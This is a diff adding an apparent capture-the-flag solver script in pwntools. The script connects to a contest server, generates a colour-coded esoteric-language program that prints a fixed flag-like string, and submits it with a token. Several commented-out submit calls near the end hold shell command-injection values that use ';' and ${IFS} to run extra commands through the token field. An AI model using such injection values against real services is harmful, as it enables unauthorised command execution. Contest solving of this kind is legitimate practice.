@@ -1,0 +1,103 @@
+#!/usr/bin/env python
+from pwn import *
+import time
+
+print int( time.time() / 60 % 60 )
+
+host , port = 'eof-exam3.ais3.org' , 7122
+#host , port = '60.251.236.18' , 3333
+y = remote( host , port )
+
+y.sendlineafter( '>' , '1' )
+
+def wri( idx , code ):
+    y.sendlineafter( '>' , '1' )
+    y.sendlineafter( ':' , str( idx ) )
+    sleep( 0.1 )
+    y.sendline( code )
+
+def burn( idx ):
+    y.sendlineafter( '>' , '2' )
+    y.sendlineafter( ':' , str( idx ) )
+
+def submit( idx , tok = 'zFErzItq' ):
+    y.sendlineafter( '>' , '3' )
+    y.sendlineafter( ':' , str( idx ) )
+    y.sendlineafter( 'token:' , tok )
+
+
+
+ans = 'Th1s 1s EOF CTF, 4nd th3 TA is v3ry KIANG!!!'
+
+add = 'red'
+sub = 'blue'
+inc = 'yellow'
+dec = 'cyan'
+pc = 'green'
+ora = 'orange'
+pin = 'pink'
+
+
+ptr = 0
+d = [ ord('T') ] + [0] * 0x27
+
+def pa( i ):
+    if i > 0:
+        return i * 6
+    else:
+        return i * 4
+
+def ua( i ):
+    if i > 0:
+        return i / 6
+    else:
+        return i / 4
+
+
+
+def find_min( c ):
+    diff = [ abs( ord( c ) - _ ) for _ in d ]
+    #diff = map( pa , diff )
+    #print diff
+    return diff.index( min( diff ) )
+
+
+p = inc * ord( 'T' )
+p += pc
+for c in ans[1:]:
+    idx = find_min( c )
+    off = ord( c ) - d[ idx ]
+    #print d , c , ord( c ) , idx , off
+
+    if ptr > idx:
+        p += sub * ( ptr - idx )
+        ptr = idx
+    elif ptr < idx:
+        p += add * ( idx - ptr )
+        ptr = idx
+
+    if off > 0:
+        p += inc * ( off )
+        d[ idx ] = ord( c )
+    elif off < 0:
+        p += dec * ( -off )
+        d[ idx ] = ord( c )
+
+    #print chr( d[ idx ] )
+    p += pc
+
+
+#print p
+#print len( p )
+
+wri( 0 , p )
+
+#burn( 0 )
+#submit( 0 , ';./submit${IFS}zFErzItq${IFS}-%s;' % ( str( 2147483647 - 4000 ) ) )
+#submit( 0 , 'zFErzItq;./submit${IFS}zFErzItq${IFS}-%s;' % ( str( 9223372036854775807 - 4000 ) ) )
+#submit( 0 , ';go run${IFS}send.go${IFS}%s${IFS}zFErzItq;' % ( '9' * 30 ) )
+submit( 0 )
+
+print y.recvall()
+y.close()
+#y.interactive()
